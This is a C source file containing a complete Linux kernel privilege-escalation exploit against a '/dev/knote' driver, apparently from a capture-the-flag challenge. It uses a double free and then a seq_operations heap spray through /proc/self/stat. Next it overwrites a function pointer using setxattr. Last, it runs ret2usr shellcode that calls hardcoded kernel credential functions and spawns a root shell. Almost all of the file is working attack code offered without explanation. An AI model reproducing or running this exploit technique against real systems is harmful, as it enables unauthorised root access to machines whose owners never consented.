#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/xattr.h>

#define KNOTE_CREATE    0x1337
#define KNOTE_DELETE    0x1338
#define KNOTE_READ      0x1339
#define KNOTE_ENCRYPT   0x133a
#define KNOTE_DECRYPT   0x133b

int dev, target;

/* Module structs */
typedef struct {
    char *data;
    size_t len;
    void (*encrypt_func)(char *, size_t);
    void (*decrypt_func)(char *, size_t);
} knote;

typedef struct {
    unsigned long idx;
    char * data;
    size_t len;
} knote_user;

/* Backup registers */
unsigned long bak_cs,bak_rflags,bak_ss,bak_rsp,bak_rip;

void bak(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov bak_cs, cs;"
        "mov bak_ss, ss;"
        "mov bak_rsp, rsp;"
        "pushf;"
        "pop bak_rflags;"
        ".att_syntax;"        
    );
    puts("[+]Registers backed up");
}

/* Helper functions */
void debug(){
    puts("[+]Halted execution");
    getchar();
}

void open_dev(){
    dev = open("/dev/knote",O_RDONLY);
    puts("[+]Interacting with device");
}

void do_create(unsigned long idx, char *data, size_t len){
    knote_user note = {
        .idx = idx,
        .data = data,
        .len = len
    };
    ioctl(dev,KNOTE_CREATE,&note);
}

void do_delete(unsigned long idx){
    knote_user note = {
        .idx = idx
    };
    ioctl(dev,KNOTE_DELETE,&note);
}

void bin_sh(){
    printf("[+]UID: %d\n",getuid());
    close(target);
    system("/bin/sh");
}
unsigned long bak_rip = (unsigned long)bin_sh;

void shellcode(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov rdi, 0;"
        "movabs rbx, 0xffffffff81053c50;"
        "call rbx;"
        "mov rdi, rax;"
        "movabs rbx, 0xffffffff81053a30;"
        "call rbx;"
        "swapgs;"
        "mov r15, bak_ss;"
        "push r15;"
        "mov r15, bak_rsp;"
        "push r15;"
        "mov r15, bak_rflags;"
        "push r15;"
        "mov r15, bak_cs;"
        "push r15;"
        "mov r15, bak_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

/* Exploit */
int main(){
    char payload[0x20];
    void *func_ptr = &shellcode;

    bak();
    open_dev();

    /* Double free */
    do_create(0, (char *)0x1337000, 0x20);
    do_delete(0);

    /* Allocate seq_operations */
    target = open("/proc/self/stat", O_RDONLY);

    /* Consume free entry */
    open("/proc/self/stat", O_RDONLY);

    /* Overlap w/ setxattr */
    setxattr("/proc/self/stat","exploit", &func_ptr, 0x20, 0);
    read(target, payload, 1);

    return 0;
}